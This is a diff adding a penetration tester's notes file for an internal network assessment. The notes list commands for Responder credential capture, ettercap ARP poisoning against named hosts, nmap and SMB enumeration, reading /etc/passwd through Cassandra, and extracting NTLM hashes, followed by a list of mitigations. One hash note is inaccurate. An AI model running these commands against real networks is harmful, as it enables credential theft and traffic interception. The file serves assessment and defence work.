@@ -1,0 +1,228 @@
+./Responder.py -I eth0 -f -w -F -P -b
+	
+
+nmap -sC -iL ips.txt -oA HCDS_20170516 -sV -p 10000,111,1234,135,139,1433,1521,2020,2049,21,22,23,2383,3071,3128,3129,3260,3268,3269,3389,389,4045,443,445,464,49152,49153,49154,49155,49156,49157,49158,49160,49161,49165,49167,514,53,5432,5800,5900,593,6129,623,636,6666,6667,80,8080,8222,8443,88,9091 —max-retries=3 —max-rtt-timeout=950ms
+
+
+nmap -sV --script=nfs-showmount -p111 -iL PORTS/111.txt -oA nfs-showmount
+
+
+nmap --script smb-enum-shares.nse -p445 -iL PORTS/445.txt -oA smb-enum-shares-445
+
+
+sudo nmap -sS -sV --script vulscan -p 21,22,23,25 <host>
+	vulscan script turns nmap into vulnscanner
+	https://github.com/scipag/vulscan
+
+
+Postgres
+=================================================
+switch to pg user   	su - postgres
+start cmd line      	psql vsa -U vsa_admin
+show schemas        	\dn
+show databases      	\l
+connect to DB		\connect vsa
+show tables     	\dt+ vsa.*
+show table content	TABLE <tablename>;
+show views      	\dv aid.*
+show views      	\dv+ vsa.*
+/usr/bin/psql vsa -c "$name_query" -U vsa_admin
+
+
+
+Cassandra
+=================================================
+cqlsh 10.162.60.117 9042
+DESCRIBE TABLES;	-> lists keystores / databases and their tables
+USE <keystore name>;
+select * from <table name>;
+
+SOURCE ‘/etc/passwd’ 	-> pulls local file
+
+
+
+
+Find all World Readable Files:
+find / \( -perm -0004 \) |grep -v tmp |grep -v dev/ |grep -v sys/ |grep -v proc/ |grep -v boot/ |grep -v lib/
+
+
+ettercap --log-msg ettercap-20170516.log -T -q -w ettercap-20170516.pcap -P smb_down -F LMHC_filter-web.ef -M arp:remote -p -i eth0 /10.162.60.126(gateway)// /10.162.60.68-93;10.162.60.122-125//
+
+	Then run pcredz on the pcap file afterwards
+
+
+smbclient -U guest -N -L <IP of Host>
+	-N 	-> No password prompt
+	-L	-> List shares
+
+
+
+NTDS.dit : ntlm - cd, LM NThash
+
+LM Hash - two 7 character chunks
+NTLM AKA NTHash - MD4(UTF-16-LE) password
+NetNTLMv1 - 3* des(nthash + chal) = 3* des(md4(password) + Chal)
+NetNTLMv2 - (md5(nthash + chal1 +chal2) = md5(md4(password)+chal1+chal2)
+mscache - bcrypt(password)
+	mscache - allows you to login to laptop without access to Domain Controller
+
+
+
+
+*****************************************************************************************
+Tools:
+
+responder:
+	dns stuff:
+		dns
+		LLMNR 
+		NBTNS - resolution protocol, smb connections netntlm
+	Fake Servers:
+		wpad - auto auth with IE
+		ldap
+		smb
+		mssql
+		http/s
+		DHCP
+
+	./Responder.py -I eth0 -f -w -F -P -b
+		-I 	interface
+		-f	fingerprint a host
+		-w	wpad
+		-F	Force Wpad Auth
+		-P	Force NTLM/Basic auth for proxy
+		-b	basic - return a basic HTTP auth
+
+
+YASUO Scanner by @0xsauby - looks for misconfigurations 
+	https://github.com/0xsauby/yasuo
+
+
+pcredz -tool for extracting NTLM hashes out of pcap or live interfaces
+	On Kali:
+		apt-get remove python-pypcap
+		apt-get install python-libpcap
+		git clone https://github.com/lgandx/PCredz.git
+	
+	./Pcredz -f <file-toparse.pcap>
+
+	./Pcredz -d /home/pnt/pcaps	#directory to parse recursivly
+
+	./Pcredz -i eth0		#live capture
+
+
+
+impacket - library for handling connections; ntlm, etc.
+
+enum4linux - dumps data from domain given creds and domain name. Anonymous works rarely
+	enum4linux -a -o <hostname> 	#will test with anonymous
+	enum4linux -a -o -u "<user>" -p "<password>" <hostname>
+
+
+ldapdump - ldap queries for getting domain data
+	apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev
+	pip install python-ldap pyldap
+	git clone https://github.com/jtilander/ldapdump.git
+	
+
+	export environment variable before running:
+
+		export LDAP_SERVER=server.mydomain.com
+		export LDAP_BASE_DN="dc=mydomain, dc=com"
+		export LDAP_USERNAME=username@mydomain.com
+		export LDAP_PASSWORD=password
+
+	cd ldapdump
+	make image
+	make run
+	#python ./ldapdump.py
+
+
+meterpreter
+
+empire - powershell reverse shell, much like meterpreter using powershell 
+
+bloodhound - asks who is admin on which machine. lets you know where admin is 
+	and path to go to get to admin
+
+deathstar - "one click" use of bloodhound but does everything for you
+
+
+cme (crack map exec) - dumping creds, domain data, etc. (uses impacket behind the scenes)
+	apt-get install crackmapexec
+
+
+
+cobalt strike - same as meterpreter and empire. Costs $$$, DNS shell, multiple people use
+	at once.
+
+powerup - escalate privs on local machine, lists design errors. For example, will show
+	app that starts up as "system" account, replace the .exe with meterpreter, etc.
+
+
+
+GPO's that control ability to enumerate users:
+1. Network access: Do not allow anonymous SID/Name translation
+2. Network access: Do not allow anonymous enumeration of SAM accounts
+3. Network access: Do not allow anonymous enumeration of SAM accounts and shares
+4. Network access: Let Everyone permissions apply to anonymous users
+5. Network access: Restrict Anonymous access to Named Pipes and Shares
+6. Network access: Shares that can be accessed anonymously
+
+
+*****************************************************************************************
+
+Good password lists and fuzzing stuff:
+https://github.com/danielmiessler/SecLists
+	
+*****************************************************************************************
+
+Metasploit:
+
+look for all exploits and auxiliary modules for a specific port:
+on kali:
+	cd /usr/share/metasploit-framework/modules
+	PORT=<port num>; grep RPORT -ri . |grep \($PORT\) |cut -d\: -f1
+
+
+*****************************************************************************************
+
+Mitigations:
+
+Look into Microsoft Securing Privileged Access
+ 
+https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access
+ 
+https://www.malwarearchaeology.com/cheat-sheets/
+ 
+http://adsecurity.org/
+ 
+https://posts.specterops.io/tagged/bloodhound?gi=3270315c3d6a
+ 
+-DIsable LLMNR (link local multicast name resolution)
+-Disable WPAD (Windows Proxy Auto Discovery)
+-Disable NBT-NS (NetBIOS Name Services)
+$NetworkAdapters = (get-wmiobject win32_networkadapterconfiguration)
+ForEach ($NetworkAdapterItem in $NetworkAdapters) { $NetworkAdapterItem.SetTCPIPNetbios(2) }
+-Enforce SMB Signing
+-Disable Powershell 2, enable powershell v5, deploy poweshell transcription block logging, module logging and script block logging
+-use microsoft ata (advanced threat analytics)
+-deploy PAW (privileged access workstations)
+-deploy red forest
+-deploy local admin password solution (LAPS)
+-remove local admin
+-deploy credential guard
+-deploy device guard
+-deploy sysmon with the security taylor swift ruleset
+-deploy applocker
+-disable SMBv1
+-employ windows firewall blocking inbound 3389,445,139,137,5895/5896 unless authentication through a VPN from managed workstations
+-make sure nac and va scanners don't spray creds
+-look at mimikatz protection such as rdp restricted admin mode
+http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png
+-deploy tier 0/1/2 isolation
+-secure dynamic dns updates
+-disable netbios-name services
+
+
+
